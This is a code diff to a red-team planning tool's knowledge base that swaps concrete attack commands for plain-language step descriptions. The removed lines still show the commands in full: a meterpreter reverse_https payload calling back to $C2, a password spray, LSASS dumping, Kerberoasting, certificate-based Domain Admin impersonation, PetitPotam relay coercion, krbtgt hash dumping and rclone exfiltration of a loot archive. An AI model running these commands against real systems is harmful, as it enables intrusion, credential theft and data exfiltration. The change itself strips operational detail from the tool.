@@ -7,9 +7,9 @@ compromise, plus web/Linux footholds, data collection, exfiltration, and a
 offer several genuinely different plans for the same objective.
 
 Each play carries the "drill-down" detail a red teamer actually needs:
-what it achieves, the ordered commands, the success indicator, and the
-secondary technique to fall back to. Commands are illustrative starting
-points for authorized engagements, not copy-paste guarantees.
+what it achieves, the plain-language actions, the success indicator, and the
+secondary technique to fall back to. Siege Tower suggests the tools for each
+step (see tools.py); it never runs anything.
 
 The knowledge base is data, not code — Bulwark (or any host) can extend or
 replace it by passing its own list of Play objects to the engine.
@@ -47,13 +47,11 @@ _CORE_PLAYS: list[Play] = [
         prerequisite_note="Scope IP ranges/domains from the ROE.",
         steps=(
             PlayStep(
-                command="nmap -sV -Pn -p- --min-rate 2000 -oA recon/ext $SCOPE_CIDR",
-                description="Full TCP service sweep across the in-scope ranges.",
+                action="Full TCP service sweep across the in-scope ranges.",
                 expected_result="Open ports and service/version banners per host.",
             ),
             PlayStep(
-                command="httpx -l recon/web_hosts.txt -title -tech-detect -status-code",
-                description="Fingerprint web tiers and technologies.",
+                action="Fingerprint web tiers and technologies.",
                 expected_result="A list of live web apps with detected stacks.",
             ),
         ),
@@ -78,18 +76,15 @@ _CORE_PLAYS: list[Play] = [
         prerequisite_note="A vulnerable, in-scope public service from recon.",
         steps=(
             PlayStep(
-                command="nuclei -u https://$TARGET -severity critical,high",
-                description="Confirm the exploitable vulnerability with a template.",
+                action="Confirm the exploitable vulnerability with a template.",
                 expected_result="A positive match on an RCE/injection template.",
             ),
             PlayStep(
-                command="curl -s https://$TARGET/vuln --data-binary @payload.txt",
-                description="Deliver the exploit payload for the confirmed bug.",
+                action="Deliver the exploit payload for the confirmed bug.",
                 expected_result="A command runs on the server (e.g. id / whoami).",
             ),
             PlayStep(
-                command="msfvenom -p linux/x64/meterpreter/reverse_https LHOST=$C2 -f elf -o beacon",
-                description="Stage an interactive callback for a stable session.",
+                action="Stage an interactive callback for a stable session.",
                 expected_result="A returning session/beacon from the target.",
             ),
         ),
@@ -113,13 +108,11 @@ _CORE_PLAYS: list[Play] = [
         prerequisite_note="Harvested target email addresses; a sending domain.",
         steps=(
             PlayStep(
-                command="gophish  # stand up campaign, clone the login portal",
-                description="Build the lure and track opens/clicks/credentials.",
+                action="Build the lure and track opens/clicks/credentials.",
                 expected_result="A campaign ready with a payload or credential trap.",
             ),
             PlayStep(
-                command="# deliver macro/ISO/LNK loader that beacons to $C2 over HTTPS",
-                description="Send the lure to the target user set.",
+                action="Send the lure to the target user set.",
                 expected_result="A user executes the loader; a beacon checks in.",
             ),
         ),
@@ -143,13 +136,11 @@ _CORE_PLAYS: list[Play] = [
         prerequisite_note="An exposed auth surface (OWA/VPN/O365) and a user list.",
         steps=(
             PlayStep(
-                command="kerbrute userenum -d $DOMAIN --dc $DC users.txt",
-                description="Validate which usernames exist before spraying.",
+                action="Validate which usernames exist before spraying.",
                 expected_result="A filtered list of valid domain usernames.",
             ),
             PlayStep(
-                command="kerbrute passwordspray -d $DOMAIN valid_users.txt 'Season2025!'",
-                description="Try one password across all accounts to dodge lockout.",
+                action="Try one password across all accounts to dodge lockout.",
                 expected_result="One or more VALID username:password pairs.",
             ),
         ),
@@ -171,13 +162,11 @@ _CORE_PLAYS: list[Play] = [
         prerequisite_note="Valid domain credentials and a reachable remote service.",
         steps=(
             PlayStep(
-                command="openconnect --user=$USER https://vpn.$DOMAIN",
-                description="Authenticate to the remote access service.",
+                action="Authenticate to the remote access service.",
                 expected_result="An internal IP lease and route to the LAN.",
             ),
             PlayStep(
-                command="xfreerdp /u:$USER /d:$DOMAIN /v:$JUMPHOST +clipboard",
-                description="Reach an internal jump/workstation for execution.",
+                action="Reach an internal jump/workstation for execution.",
                 expected_result="An interactive session on an internal host.",
             ),
         ),
@@ -202,13 +191,11 @@ _CORE_PLAYS: list[Play] = [
         prerequisite_note="A low-privilege foothold on a host.",
         steps=(
             PlayStep(
-                command="winpeas.exe  # or linpeas.sh on Linux",
-                description="Enumerate local privilege-escalation vectors.",
+                action="Enumerate local privilege-escalation vectors.",
                 expected_result="A shortlist of misconfigurations/exploitable paths.",
             ),
             PlayStep(
-                command="# abuse the confirmed vector (unquoted service, SUID, kernel)",
-                description="Execute the chosen escalation path.",
+                action="Execute the chosen escalation path.",
                 expected_result="A shell running as SYSTEM/root.",
             ),
         ),
@@ -230,8 +217,7 @@ _CORE_PLAYS: list[Play] = [
         prerequisite_note="Code execution on a host with an internal interface.",
         steps=(
             PlayStep(
-                command="proxychains nmap -sT -Pn -p 88,445,389,3389 10.0.0.0/16",
-                description="Pivot a scan through the foothold to find DCs/servers.",
+                action="Pivot a scan through the foothold to find DCs/servers.",
                 expected_result="Internal hosts and roles (DCs, file servers).",
             ),
         ),
@@ -253,13 +239,11 @@ _CORE_PLAYS: list[Play] = [
         prerequisite_note="Local admin on a domain-joined host.",
         steps=(
             PlayStep(
-                command="nanodump --write C:\\Windows\\Temp\\l.dmp",
-                description="Dump LSASS memory with a low-detection tool.",
+                action="Dump LSASS memory with a low-detection tool.",
                 expected_result="A minidump containing credential material.",
             ),
             PlayStep(
-                command="pypykatz lsa minidump l.dmp",
-                description="Parse the dump offline for secrets.",
+                action="Parse the dump offline for secrets.",
                 expected_result="Cleartext creds, NTLM hashes, or Kerberos tickets.",
             ),
         ),
@@ -284,13 +268,11 @@ _CORE_PLAYS: list[Play] = [
         prerequisite_note="Any valid domain credentials with LAN access.",
         steps=(
             PlayStep(
-                command="bloodhound-python -d $DOMAIN -u $USER -p $PASS -c All -ns $DC",
-                description="Collect AD objects and relationships.",
+                action="Collect AD objects and relationships.",
                 expected_result="A dataset of domain paths to high-value groups.",
             ),
             PlayStep(
-                command="# In BloodHound: 'Shortest paths to Domain Admins'",
-                description="Identify the concrete escalation chain to abuse.",
+                action="Identify the concrete escalation chain to abuse.",
                 expected_result="A named path (Kerberoast, ADCS, ACL, etc.).",
             ),
         ),
@@ -315,13 +297,11 @@ _CORE_PLAYS: list[Play] = [
         prerequisite_note="A domain user and an SPN in/near a privileged group.",
         steps=(
             PlayStep(
-                command="GetUserSPNs.py -request -dc-ip $DC $DOMAIN/$USER:$PASS -outputfile spns.txt",
-                description="Request service tickets for accounts with SPNs.",
+                action="Request service tickets for accounts with SPNs.",
                 expected_result="TGS-REP hashes for crackable service accounts.",
             ),
             PlayStep(
-                command="hashcat -m 13100 spns.txt rockyou.txt -r best64.rule",
-                description="Crack the service ticket hashes offline.",
+                action="Crack the service ticket hashes offline.",
                 expected_result="A cleartext password for a privileged account.",
             ),
         ),
@@ -344,18 +324,15 @@ _CORE_PLAYS: list[Play] = [
         prerequisite_note="An ADCS template allowing SAN + client-auth for users.",
         steps=(
             PlayStep(
-                command="certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -vulnerable",
-                description="Locate vulnerable certificate templates (ESC1-8).",
+                action="Locate vulnerable certificate templates (ESC1-8).",
                 expected_result="A template flagged ESC1 the user can enrol.",
             ),
             PlayStep(
-                command="certipy req -u $USER@$DOMAIN -p $PASS -ca $CA -template $T -upn administrator@$DOMAIN",
-                description="Request a cert impersonating a Domain Admin.",
+                action="Request a cert impersonating a Domain Admin.",
                 expected_result="A .pfx for the administrator account.",
             ),
             PlayStep(
-                command="certipy auth -pfx administrator.pfx -dc-ip $DC",
-                description="Authenticate with the forged certificate.",
+                action="Authenticate with the forged certificate.",
                 expected_result="A TGT/NT hash for Domain Admin.",
             ),
         ),
@@ -377,8 +354,7 @@ _CORE_PLAYS: list[Play] = [
         prerequisite_note="An account with DS-Replication rights (from looting/ACLs).",
         steps=(
             PlayStep(
-                command="secretsdump.py -just-dc-user krbtgt $DOMAIN/$USER@$DC -hashes :$NTLM",
-                description="Abuse replication to dump target account hashes.",
+                action="Abuse replication to dump target account hashes.",
                 expected_result="NTLM hashes for krbtgt / Domain Admins.",
             ),
         ),
@@ -401,13 +377,11 @@ _CORE_PLAYS: list[Play] = [
         prerequisite_note="A web-enrolment CA (ESC8) reachable on the LAN.",
         steps=(
             PlayStep(
-                command="certipy relay -ca http://$CA/certsrv/certfnsh.asp -template DomainController",
-                description="Stand up the relay listener targeting the CA.",
+                action="Stand up the relay listener targeting the CA.",
                 expected_result="Relay server waiting for inbound DC auth.",
             ),
             PlayStep(
-                command="PetitPotam.py -u $USER -p $PASS $ATTACKER $DC_IP",
-                description="Coerce the DC to authenticate to the relay.",
+                action="Coerce the DC to authenticate to the relay.",
                 expected_result="A machine-account certificate for the DC.",
             ),
         ),
@@ -430,13 +404,11 @@ _CORE_PLAYS: list[Play] = [
         prerequisite_note="An unpatched DC (CVE-2020-1472 etc.). Can break replication.",
         steps=(
             PlayStep(
-                command="zerologon_tester.py $DC_NAME $DC_IP",
-                description="Non-destructively test whether the DC is vulnerable.",
+                action="Non-destructively test whether the DC is vulnerable.",
                 expected_result="Confirmation the DC is exploitable.",
             ),
             PlayStep(
-                command="# run the exploit only with explicit sign-off; restore the machine password after",
-                description="Reset the DC machine password to empty, then restore it.",
+                action="Reset the DC machine password to empty, then restore it.",
                 expected_result="Temporary DA-equivalent access to the DC.",
             ),
         ),
@@ -460,8 +432,7 @@ _CORE_PLAYS: list[Play] = [
         prerequisite_note="Code execution on a host holding in-scope data.",
         steps=(
             PlayStep(
-                command="# grep -ri 'password\\|secret\\|PAN' /home /srv 2>/dev/null",
-                description="Search for sensitive material matching the objective.",
+                action="Search for sensitive material matching the objective.",
                 expected_result="Files of interest identified for staging.",
             ),
         ),
@@ -483,8 +454,7 @@ _CORE_PLAYS: list[Play] = [
         prerequisite_note="A domain identity with access to the repositories.",
         steps=(
             PlayStep(
-                command="snaffler.exe -s -o snaffle.log",
-                description="Sweep reachable file shares for sensitive content.",
+                action="Sweep reachable file shares for sensitive content.",
                 expected_result="A list of high-value files across shares.",
             ),
         ),
@@ -508,13 +478,11 @@ _CORE_PLAYS: list[Play] = [
         prerequisite_note="Staged data and an egress path the team may use.",
         steps=(
             PlayStep(
-                command="7z a -p$PW -mhe=on loot.7z ./staged/",
-                description="Encrypt and compress the staged data first.",
+                action="Encrypt and compress the staged data first.",
                 expected_result="A single encrypted archive of the objective data.",
             ),
             PlayStep(
-                command="rclone copy loot.7z remote:redteam-evidence",
-                description="Transfer over an approved web service to a controlled sink.",
+                action="Transfer over an approved web service to a controlled sink.",
                 expected_result="Archive lands in the team-controlled bucket.",
             ),
         ),
@@ -539,13 +507,11 @@ _CORE_PLAYS: list[Play] = [
         prerequisite_note="Explicit written sign-off for a simulated impact action.",
         steps=(
             PlayStep(
-                command="# deploy a benign EICAR-style marker file via GPO/PsExec fleet-wide",
-                description="Simulate mass deployment using a harmless canary, not a crypter.",
+                action="Simulate mass deployment using a harmless canary, not a crypter.",
                 expected_result="The marker appears on hosts, proving reach.",
             ),
             PlayStep(
-                command="# collect deployment proof, then remove all markers",
-                description="Evidence the blast radius, then fully clean up.",
+                action="Evidence the blast radius, then fully clean up.",
                 expected_result="Documented reach with all artifacts removed.",
             ),
         ),
